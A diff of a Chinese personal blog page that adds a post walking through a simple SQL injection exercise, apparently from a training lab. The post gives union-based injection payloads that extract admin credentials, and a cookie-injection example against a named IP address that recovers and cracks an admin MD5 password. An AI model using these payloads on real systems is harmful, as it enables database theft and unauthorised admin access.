@@ -6,12 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://wangzhiming1999.github.io">
-  <title>Archives | 小小明</title>
+  <title>web简单的sql注入 | 小小明</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="小小明">
-<meta property="og:url" content="http://wangzhiming1999.github.io/archives/index.html">
+  <meta name="description" content="——————————————————第一题sql注入第一步，判断是否存在sql注入漏洞在地址栏添加构造 ?id&#x3D;1 and 1&#x3D;1 ，回车2.页面返回正常构造 ?id&#x3D;1 and 1&#x3D;2 ,回车第二步:判断字段数构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车页面正常构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车页面正常构造 ?id&#x3D;1 and 1&#x3D;1 order by">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web简单的sql注入">
+<meta property="og:url" content="http://wangzhiming1999.github.io/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="小小明">
+<meta property="og:description" content="——————————————————第一题sql注入第一步，判断是否存在sql注入漏洞在地址栏添加构造 ?id&#x3D;1 and 1&#x3D;1 ，回车2.页面返回正常构造 ?id&#x3D;1 and 1&#x3D;2 ,回车第二步:判断字段数构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车页面正常构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车页面正常构造 ?id&#x3D;1 and 1&#x3D;1 order by">
+<meta property="article:published_time" content="2020-01-07T03:54:14.000Z">
+<meta property="article:modified_time" content="2020-01-07T03:54:46.600Z">
 <meta property="article:author" content="王志明">
 <meta name="twitter:card" content="summary">
   
@@ -163,157 +167,206 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-web简单的sql注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/07/linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2020-01-07T04:19:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/07/linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">linux命令总结</a>
+    <h1 class="article-title" itemprop="name">
+      web简单的sql注入
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  <a href="/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
   	<time datetime="2020-01-07T03:54:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/">web简单的sql注入</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
 
+  
+  <span class="archive-article-date">
+    阅读量 <span id="busuanzi_value_page_pv"></span>
+  </span>
+  
+  </header>
+
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>——————————————————第一题sql注入<br>第一步，判断是否存在sql注入漏洞在地址栏添加<br>构造 ?id=1 and 1=1 ，回车<br>2.页面返回正常<br>构造 ?id=1 and 1=2 ,回车<br>第二步:判断字段数<br>构造 ?id=1 and 1=1 order by 1 回车<br>页面正常<br>构造 ?id=1 and 1=1 order by 2 回车<br>页面正常<br>构造 ?id=1 and 1=1 order by 3 回车<br>页面返回 错误，判断字段数为   2<br>第三步：判断回显点<br>构造 ?id=1 and 1=2 union select 1,2 回车<br>页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容<br>第四步:查询相关内容<br>查询当前数据库名<br>构造 ?id=1 and 1=2 union select 1,database() 回车<br>查询当前数据库版本<br>构造 ?id=1 and 1=2 union select 1,version() 回车<br>查询当前数据库 表名<br>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 回车<br>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 回车<br>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 1,1 回车<br>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1 回车<br>查出 admin 表里 有  id   username  password  三个字段<br>查询字段内容<br>构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车<br>构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车<br>limit 1,1 没有回显，说明只有一个用户<br>构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车<br>得到管理员账号和密码<br>————————————第二题cookie注入<br>我们尝试，将测试语句放到cookie里面，再发送给服务器，因为网页防护一般只拦截Get、post传参。<br>我们打开Chrome浏览器，这里用到了ModHeader插件（可点击这里或在附件下载）。<br>我们点击+号新增一个Request头。<br>我们添加一个Cookie头，并写值为id=171，并确保已开启（打勾）<br>我们直接访问<br><a href="http://120.203.13.111:8001/shownews.asp" target="_blank" rel="noopener">http://120.203.13.111:8001/shownews.asp</a><br>返回显示正常，<br>这证明cookie里的id=171，也能正常传参，被当作sql语句拼接。那我们直接进行注入。<br>我们输入Cookie值为：<br>id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin<br>继续猜测是否存在admin表（+号代替空格，不然会出错）<br>发现页面回显了2、3、7、8、9。<br>没有出现数据库错误，这证明admin表是存在的。且第2、第3、7、8、9字段，可以用来猜测字段名，同时，可以直接回显在页面上。<br>我们接着尝试猜测最常见的管理表字段名Username和Password，我们在2、3、7、8、9中任选两个，分别填入Username和Password<br>比如2和3：<br>id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin<br>接着刷新页面，发现页面返回了admin表中，username和password字段的值：admin、b9a2a2b5dffb918c<br>这应该就是管理员用户名和密码了，但管理员密码看起来有些奇怪。字母+数字的16位组合，很像md5的特征。<br>打开cmd5.com（解密站点）<br>将b9a2a2b5dffb918c进行解密。<br>发现密码的明文是welcome。<br>这个站貌似是南方的CMS，默认管理员后台是根目录的/admin/。<br>我们尝试打开后台：<br><a href="http://120.203.13.111:8001/admin/" target="_blank" rel="noopener">http://120.203.13.111:8001/admin/</a><br>出现管理员登录页面，输入用户名admin、密码welcome，填写验证码。</p>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:;" class="page-reward-btn tooltip-top">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我喝奶茶<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/ali.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/weixin.jpg">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </a>
+    </div>
+    
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://wangzhiming1999.github.io/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
+
+
+<nav id="article-nav">
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/07/hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="archive-article-date">
-  	<time datetime="2020-01-07T03:50:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
-</a>
+    <a href="/2020/01/07/linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          linux命令总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/01/07/hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">hexo 搭建个人博客</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/07/hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">hexo 搭建个人博客</a>
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/05/git%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" class="archive-article-date">
-  	<time datetime="2020-01-05T09:16:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/05/git%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/">git命令大全</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/05/hello-world/" class="archive-article-date">
-  	<time datetime="2020-01-05T09:08:56.655Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/05/hello-world/">Hello World</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
+
+
+
+
+
+
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+
+<script>
+var gitalk = new Gitalk({
+  clientID: 'your clientID',
+  clientSecret: 'your clientSecret',
+  repo: 'https://github.com/wangzhiming1999/wangzhiming1999.github.io/issues',
+  owner: 'wangzhiing1999',
+  admin: ['wangzhiing1999'],
+  id: md5(window.location.pathname),
+  distractionFreeMode: true
+})
+
+gitalk.render('gitalk-container')
+</script>
+
+
+
 
 
           </div>
@@ -366,8 +419,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
